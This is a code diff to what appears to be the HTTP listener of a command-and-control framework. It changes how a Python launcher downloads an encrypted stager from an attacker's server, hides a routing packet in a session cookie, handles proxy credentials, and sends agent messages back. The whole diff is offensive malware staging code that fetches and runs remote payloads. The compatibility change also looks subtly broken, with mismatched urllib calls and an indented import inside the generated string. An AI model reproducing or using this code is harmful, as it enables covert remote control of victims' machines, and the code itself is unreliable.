@@ -474,7 +474,12 @@ class Listener(object):
                     profile = listenerOptions['DefaultProfile']['Value']
                     userAgent = profile.split('|')[1]
 
-                launcherBase += "import urllib.request;\n"
+                launcherBase += """
+                if sys.version_info[0] >= 3:
+                    import urllib.request as urllib;
+                else:
+                    import urllib2 as urllib;
+                    """
                 launcherBase += "UA='%s';" % (userAgent)
                 launcherBase += "server='%s';t='%s';" % (host, stage0)
 
@@ -484,7 +489,7 @@ class Listener(object):
 
                 b64RoutingPacket = base64.b64encode(routingPacket).decode('UTF-8')
 
-                launcherBase += "req=urllib.request.Request(server+t);\n"
+                launcherBase += "req=urllib.Request(server+t);\n"
 
                 # Add custom headers if any
                 if customHeaders != []:
@@ -496,39 +501,39 @@ class Listener(object):
 
                 if proxy.lower() != "none":
                     if proxy.lower() == "default":
-                        launcherBase += "proxy = urllib.request.ProxyHandler();\n"
+                        launcherBase += "proxy = urllib.ProxyHandler();\n"
                     else:
                         proto = proxy.split(':')[0]
-                        launcherBase += "proxy = urllib.request.ProxyHandler({'" + proto + "':'" + proxy + "'});\n"
+                        launcherBase += "proxy = urllib.ProxyHandler({'" + proto + "':'" + proxy + "'});\n"
 
                     if proxyCreds != "none":
                         if proxyCreds == "default":
-                            launcherBase += "o = urllib.request.build_opener(proxy);\n"
+                            launcherBase += "o = urllib.build_opener(proxy);\n"
 
                             # add the RC4 packet to a cookie
                             launcherBase += "o.addheaders=[('User-Agent',UA), (\"Cookie\", \"session=%s\")];\n" % (
                             b64RoutingPacket)
                         else:
-                            launcherBase += "proxy_auth_handler = urllib.request.ProxyBasicAuthHandler();\n"
+                            launcherBase += "proxy_auth_handler = urllib.ProxyBasicAuthHandler();\n"
                             username = proxyCreds.split(':')[0]
                             password = proxyCreds.split(':')[1]
                             launcherBase += "proxy_auth_handler.add_password(None,'" + proxy + "','" + username + "','" + password + "');\n"
-                            launcherBase += "o = urllib.request.build_opener(proxy, proxy_auth_handler);\n"
+                            launcherBase += "o = urllib.build_opener(proxy, proxy_auth_handler);\n"
 
                             # add the RC4 packet to a cookie
                             launcherBase += "o.addheaders=[('User-Agent',UA), (\"Cookie\", \"session=%s\")];\n" % (
                             b64RoutingPacket)
                     else:
-                        launcherBase += "o = urllib.request.build_opener(proxy);\n"
+                        launcherBase += "o = urllib.build_opener(proxy);\n"
                 else:
-                    launcherBase += "o = urllib.request.build_opener();\n"
+                    launcherBase += "o = urllib.build_opener();\n"
 
                 # install proxy and creds globally, so they can be used with urlopen.
-                launcherBase += "urllib.request.install_opener(o);\n"
+                launcherBase += "urllib.install_opener(o);\n"
 
                 # download the stager and extract the IV
 
-                launcherBase += "a=urllib.request.urlopen(req).read();\n"
+                launcherBase += "a=urllib.urlopen(req).read();\n"
                 launcherBase += "IV=a[0:4];"
                 launcherBase += "data=a[4:];"
                 launcherBase += "key=IV+'%s'.encode('UTF-8');" % (stagingKey)
@@ -945,7 +950,7 @@ def send_message(packets=None):
     requestUri = server + taskURI
 
     try:
-        data = (urllib.request.urlopen(urllib.request.Request(requestUri, data, headers))).read()
+        data = (urllib.urlopen(urllib.request.Request(requestUri, data, headers))).read()
         return ('200', data)
 
     except urllib.request.HTTPError as HTTPError:
@@ -957,7 +962,7 @@ def send_message(packets=None):
 
         return (HTTPError.code, '')
 
-    except urllib.request.URLError as URLerror:
+    except urllib.URLError as URLerror:
         # if the server cannot be reached
         missedCheckins = missedCheckins + 1
         return (URLerror.reason, '')
